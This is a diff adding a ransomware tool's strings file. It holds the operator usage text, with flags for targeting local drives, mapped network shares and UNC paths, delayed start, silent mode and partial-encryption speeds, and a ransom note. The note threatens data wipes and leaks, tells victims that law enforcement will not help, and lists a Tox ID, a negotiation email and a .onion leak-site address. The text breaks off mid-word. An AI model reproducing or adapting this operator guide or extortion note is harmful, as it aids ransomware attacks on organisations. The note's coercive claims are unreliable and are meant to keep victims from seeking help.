@@ -1,0 +1,47 @@
+Usage: %s --password PASS [--path DIR1,DIR2,...] [--T MIN] [--silent] [--full] [--system] [--shares] [--fast] [--superfast] [--ultrafast] 
+
+
+  Main Flags 
+  --password PASS    Access password (required)
+  --path DIRS        Comma-separated list of target directories/disks (optional)
+  --T MIN            Delay before start, in minutes (optional)
+  --silent           Silent mode: do NOT rename files after encryption (optional)
+
+  Mode Flags (cant be mixed) 
+  --system           Run as SYSTEM: encrypt only local drives (optional)
+  --shares           Encrypt only mapped network drives and available UNC shares in session context (optional)
+  --full             Two-phase: --system + --shares. Best practice. (optional)
+
+  Speed Flags (cant be mixed) 
+  --fast             9 percent crypt. (optional)
+  --superfast             3 percent crypt. (optional)
+  --ultrafast             1 percent crypt. (optional)
+
+    Example 1: --password QWERTY --path "C:\,D:\,\\nas\share" --T 15 --silent
+    Example 2: --password QWERTY --system --fast
+    Example 3: --password QWERTY --shares --T 10
+    Example 4: --password QWERTY --full --ultrafast 
+
+[+]
+ead0d7a8ae0a6ffb7f0a5873fec4ff5e = YOUR ID
+
+Gentlemen, your network is under our full control.
+All your files are now encrypted and inaccessible.
+
+1. Any modification of encrypted files will make recovery impossible. 
+2. Only our unique decryption key and software can restore your files. 
+   Brute-force, RAM dumps, third-party recovery tools are useless.
+   It���s a fundamental mathematical reality. Only we can decrypt your data.
+3. Law enforcement, authorities, and ���data recovery��� companies will NOT help you.
+   They will only waste your time, take your money, and block you from recovering your files ��� your business will be lost.
+4. Any attempt to restore systems, or refusal to negotiate, may lead to irreversible wipe of all data and your network.
+5. We have exfiltrated all your confidential and business data (including NAS, clouds, etc). 
+   If you do not contact us, it will be published on our leak site and distributed to major hack forums and social networks.
+
+TOX CONTACT - RECOVER YOUR FILES
+Contact us (add via TOX ID): 88984846080D639C9A4EC394E53BA616D550B2B3AD691942EA2CCD33AA5B9340FD1A8FF40E9A
+Download Tox messenger: https://tox.chat/download.html
+Reserve contact  (email) : negotiation_hapvida@proton.me
+
+Check our blog: http://tezwsse5czllksjb7cwp65rvnk4oobmzti2znn42i43bjdfd2prqqkad.onion/ 
+Downlo
